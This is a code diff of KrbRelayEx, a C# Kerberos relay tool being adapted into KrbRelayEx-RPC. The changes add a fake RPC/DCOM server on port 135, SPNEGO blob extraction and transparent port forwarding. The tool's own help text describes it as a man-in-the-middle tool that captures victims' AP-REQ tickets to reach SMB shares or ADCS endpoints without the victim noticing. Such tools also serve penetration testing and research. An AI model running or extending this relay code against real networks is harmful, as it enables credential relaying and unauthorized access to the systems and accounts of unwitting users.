@@ -28,6 +28,10 @@ using static KrbRelay.Natives;
 
 using static System.Runtime.InteropServices.JavaScript.JSType;
 using KrbRelay.Clients.Attacks.Smb;
+using System.Text.RegularExpressions;
+using KrbRelayEx.Misc;
+using Org.BouncyCastle.Bcpg;
+using Org.BouncyCastle.Ocsp;
 namespace KrbRelay
 {
 
@@ -44,26 +48,56 @@ namespace KrbRelay
         public static string RedirectHost = "";
         public static string FakeSPN = "";
         public static int SmbListenerPort = 445;
+        public static int RPCListnerPort = 135;
         public static int DcomListenerPort = 9999;
         public static string service = "";
         public static string[] RedirectPorts = null;
+        public static TcpClient myclient;
         public static byte[] AssocGroup = new byte[4];
         public static byte[] CallID = new byte[4];
-        //public static TcpForwarder tcpFwd = new TcpForwarder();
-        public static FakeSMBServer SMBtcpFwd;
-        //public static FakeSMBServer[] tcpFwdorwarders;
+        public static FakeRPCServer RPCtcpFwd;
+        
         public static Socket currSourceSocket { get; set; }
         public static Socket currDestSocket { get; set; }
-        //public static bool relayed = false;
+        
         public static bool forwdardmode = false;
-
-        //public static int numClientConnect = 0;
+        public static bool Ignore = false;
+        
         public static byte[] apreqBuffer;
-        //public static NetworkStream stream;
+        
         public static bool bgconsole = false;
         public static int bgconsoleStartPort = 10000;
-
-        public static byte[] ExtractSecurityBlob(byte[] sessionSetupRequest)
+        public static FakeRPCServer currSocketServer;
+        
+        public static string ExtractPortFromBinding(string binding)
+        {
+            // Regular expression to capture the port inside square brackets
+            Match match = Regex.Match(binding, @"\[(\d+)\]");
+            if (match.Success)
+            {
+                return match.Groups[1].Value;
+            }
+            return null;
+        }
+        public static int FindGssApiBlob(byte[] packet)
+        {
+            // Look for the ASN.1 tag (0x60) that marks the start of a GSS-API token
+            // followed by a valid OID like SPNEGO (OID 1.3.6.1.5.5.2 -> 06 06 2B 06 01 05 05 02)
+            for (int i = 0; i < packet.Length - 4; i++)
+            {
+                if (packet[i] == 0x60 && packet[i + 1] == 0x82)
+                {
+                    // Check for SPNEGO OID
+                    if (packet[i + 4] == 0x06 && packet[i + 5] == 0x06 && packet[i + 6] == 0x2B)
+                    {
+                        return i;
+                    }
+                }
+            }
+            return -1; // Not found
+        }
+    
+    public static byte[] ExtractSecurityBlob(byte[] sessionSetupRequest)
         {
             // SMB2 Header is usually 64 bytes
             int smb2HeaderLength = 64;
@@ -105,7 +139,7 @@ byte[] securityBlob = new byte[securityBufferLength];
                 + bytesPerLine           // - characters to show the ascii value
                 + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)
 
-            char[] line = (new string(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
+            char[] line = (new string(' ', lineLength - 2) + "\r\n").ToCharArray();
             int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
             StringBuilder result = new StringBuilder(expectedLines * lineLength);
 
@@ -203,13 +237,14 @@ byte[] securityBlob = new byte[securityBufferLength];
         public static bool stopSpoofing = false;
         public static bool downgrade = false;
         public static bool ntlm = false;
+        public static bool InterceptKey=true;
         public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
         public static HttpClientHandler handler = new HttpClientHandler();
         public static HttpClient httpClient = new HttpClient();
         public static CookieContainer CookieContainer = new CookieContainer();
 
-        //hooked function
+        
         private static void PrintBanner()
         {
             Console.WriteLine("");
@@ -219,32 +254,39 @@ byte[] securityBlob = new byte[securityBufferLength];
             Console.WriteLine("██╔═██╗ ██╔══██╗██╔══██╗██╔══██╗██╔══╝  ██║     ██╔══██║  ╚██╔╝  ██╔══╝   ██╔██");
             Console.WriteLine("██║  ██╗██║  ██║██████╔╝██║  ██║███████╗███████╗██║  ██║   ██║   ███████╗██╔╝ ██╗");
             Console.WriteLine("╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝");
+            Console.WriteLine("\r\r################################################################################");
+            Console.WriteLine("#                                                                              #");
+            Console.WriteLine("#                        KrbRelayEx-RPC by @decoder_it                         #");
+            Console.WriteLine("#                                                                              #");
+            Console.WriteLine("#       Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server           #");
+            Console.WriteLine("#                                                                              #");
+            Console.WriteLine("#                                {0} - 2024                                   #", Version);
+            Console.WriteLine("#                                                                              #");
+            Console.WriteLine("#          Github: https://github.com/decoder-it/KrbRelayEx-RPC                #");
+            Console.WriteLine("#                                                                              #");
+            Console.WriteLine("################################################################################");
 
+
+        }
+        private static void ShowCommands()
+        {
+            Console.WriteLine("[*] Hit:\r\n\t=> 'q' to quit,\r\n\t=> 'r' for restarting Relaying and Port Forwarding,\r\n\t=> 's' for Forward Only\r\n\t=> 'l' for listing connected clients");
         }
         private static void ShowHelp()
         {
 
 
             PrintBanner();
-            Console.WriteLine("\r\r################################################################################");
-            Console.WriteLine("#                                                                              #");
-            Console.WriteLine("#                        KrbRelayEx by @decoder_it                             #");
-            Console.WriteLine("#                                                                              #");
-            Console.WriteLine("#       Kerberos Relay and Forwarder for (Fake) SMB MiTM Server                #");
-            Console.WriteLine("#                                                                              #");
-            Console.WriteLine("#                                {0} - 2024                                   #", Version);
-            Console.WriteLine("#                                                                              #");
-            Console.WriteLine("#          Github: https://github.com/decoder-it/KrbRelayEx                    #");
-            Console.WriteLine("#                                                                              #");
-            Console.WriteLine("################################################################################");
-
+          
             Console.WriteLine();
             Console.WriteLine("Description:");
             
-            Console.WriteLine("  KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.");
-            Console.WriteLine("  It listens for incoming SMB connections and forward the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints)");
+            Console.WriteLine("  KrbRelayEx-RPC is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.");
+            Console.WriteLine("  It listens for incoming authenticated ISystemActivator requests, extracts dynamic port bindings from EPMAPPER/OXID resolutions,");
+            Console.WriteLine("  captures the AP-REQ for accessing SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints), then dynamically");
+            Console.WriteLine("  and transparently forwards the victim's requests to the real destination host and port");
             
-            Console.WriteLine("  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.");
+            Console.WriteLine("  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired RPC/DCOM appliaction");
             Console.WriteLine();
             Console.WriteLine("Usage:");
                 Console.WriteLine("  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]");
@@ -266,9 +308,8 @@ byte[] securityBlob = new byte[securityBufferLength];
                 Console.WriteLine("Options:");
                 Console.WriteLine("  -redirectserver <IP>           Specify the IP address of the target server for the attack");
                 Console.WriteLine("  -ssl                           Use SSL transport for secure communication");
-                Console.WriteLine("  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service");
-                Console.WriteLine("  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')");
-                Console.WriteLine("  -smbport <PORT>                Specify the SMB port to listen on (default: 445)");
+                Console.WriteLine("  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,445,5985')");
+                Console.WriteLine("  -rpcport <PORT>                Specify the RPC port to listen on (default: 135)");
                 Console.WriteLine();
 
                 Console.WriteLine("Examples:");
@@ -308,18 +349,19 @@ byte[] securityBlob = new byte[securityBufferLength];
         }
 
 
-    
 
 
+     public static async Task Main(string[] args)
 
-    public static void Main(string[] args)
+    //public static void Main(string[] args)
         {
             
 
 
             bool show_help = false;
-            
+
             //Guid clsId_guid = new Guid();
+            PrintBanner();
 
             foreach (var entry in args.Select((value, index) => new { index, value }))
             {
@@ -350,6 +392,10 @@ byte[] securityBlob = new byte[securityBufferLength];
                     case "-SMBPORT":
                     case "/SMBPORT":
                         SmbListenerPort = int.Parse(args[entry.index + 1]);
+                        break;
+                    case "-RPCPORT":
+                    case "/RPCPORT":
+                        RPCListnerPort = int.Parse(args[entry.index + 1]);
                         break;
                     case "-DCOMPORT":
                     case "/DCOMPORT":
@@ -564,62 +610,83 @@ byte[] securityBlob = new byte[securityBufferLength];
 
             }
 
-           
-             SMBtcpFwd = new FakeSMBServer(SmbListenerPort, RedirectHost, 445, "SMB");
             forwdardmode = false;
-            SMBtcpFwd.Start(false);
-           
-            List<FakeSMBServer> tcpForwarders = new List<FakeSMBServer>();
+
+            
+            RPCtcpFwd = new FakeRPCServer(RPCListnerPort, RedirectHost, 135, "RPC");
+
+            RPCtcpFwd.Start(false);
+            List<PortForwarder> tcpForwarders = new List<PortForwarder>();
 
             if (RedirectPorts != null)
             {
                 foreach (string item in RedirectPorts)
                 {
 
-                    tcpForwarders.Add(new FakeSMBServer(int.Parse(item), RedirectHost, int.Parse(item)));
+                    Console.WriteLine("[*] Starting Forwarder for:{0}", item);
+                    tcpForwarders.Add(new PortForwarder(int.Parse(item), RedirectHost, int.Parse(item)));
                 }
-                foreach (FakeSMBServer item in tcpForwarders)
+                foreach (PortForwarder item in tcpForwarders)
                 {
-                    item.Start(true);
+                    item.StartAsync();
                 }
             }
 
           
             Console.WriteLine("[*] KrbRelayEx started");
-            
 
-            Console.WriteLine("[*] Hit 'q' for quit, 'r' for restarting Relaying and Port Forwarding, 'l' for listing connected clients");
+
+            ShowCommands();
             
             while (true)
             {
-                
+                //Thread.Sleep(500);
                 if (Console.KeyAvailable)
                 {
-                    
-                    ConsoleKeyInfo key = Console.ReadKey(intercept: true); 
+
+                    ConsoleKeyInfo key = Console.ReadKey(intercept: true);
+                    if (key.KeyChar == '\n' || key.KeyChar == '\r')
+                    {
+                        ShowCommands();
+                        
+                    }
                     if (key.KeyChar == 'q')
                         return;
 
                     if (key.KeyChar == 'l')
                     {
-                        SMBtcpFwd.ListConnectedClients();
+                        RPCtcpFwd.ListConnectedClients();
 
                     }
-            
-                    if (key.KeyChar == 'r')
+
+                    if (key.KeyChar == 'b')
+                    {
+                        bgconsole = !bgconsole;
+                        Console.WriteLine("[!] Background SMB console mode:{0}", bgconsole);
+                    }
+
+                        if (key.KeyChar == 'r')
                     {
                         Console.WriteLine("[!] Restarting Relay...");
-                        
-                        SMBtcpFwd.Stop();
+
+                        RPCtcpFwd.Stop();
                         forwdardmode = false;
-                        SMBtcpFwd.Start(false);
+                        RPCtcpFwd.Start(false);
 
                     }
-                    else
+                    if (key.KeyChar == 's')
                     {
-                        Thread.Sleep(500); 
+                        Console.WriteLine("[!] Restarting in Forward only...");
+
+                        RPCtcpFwd.Stop();
+                        forwdardmode = true;
+                        RPCtcpFwd.Start(true);
+
                     }
+
                 }
+                Thread.Sleep(300);
+
             }
 
         }
